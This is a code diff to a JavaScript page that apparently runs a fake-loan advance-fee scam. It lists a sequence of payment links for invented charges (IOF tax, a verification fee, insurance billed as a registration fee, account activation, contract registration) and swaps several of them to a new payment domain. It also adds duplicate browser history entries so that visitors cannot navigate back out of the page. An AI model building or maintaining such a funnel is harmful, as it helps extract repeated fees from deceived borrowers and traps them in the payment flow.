@@ -1,8 +1,8 @@
 const baseLinks = {
-    up1: "https://pay.finalizepagamento.store/695410e9ede5279f00b12e64", // IOF
-    up2: "https://pay.finalizepagamento.store/695418c3795ed29f33a38f82", // Taxa de verificação de IOF
-    up3: "https://pay.finalizepagamento.store/69541a63a1fcd46a2127c5af", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.finalizepagamento.store/69541ab8ede5279f00b13ad6", // NFe
+    up1: "https://go.cinqpay.com.br/amvchnqgtd", // IOF
+    up2: "https://go.cinqpay.com.br/67oea0oc55", // Taxa de verificação de IOF
+    up3: "https://go.cinqpay.com.br/vtaww5jown", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://go.cinqpay.com.br/rkms5oxjix", // NFe
     up5: "https://pay.finalizepagamento.store/69541af2795ed29f33a392bb", // Ativar conta
     up6: "https://pay.finalizepagamento.store/69541b24ede5279f00b13bda", // Taxa de registro do contrato
     up7: "https://pay.finalizepagamento.store/69541b98a1fcd46a2127c7cb", // Parabéns, 20k adicional
@@ -34,4 +34,5 @@ function redirect(key) {
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
 history.pushState({}, '', location.href);
+
 
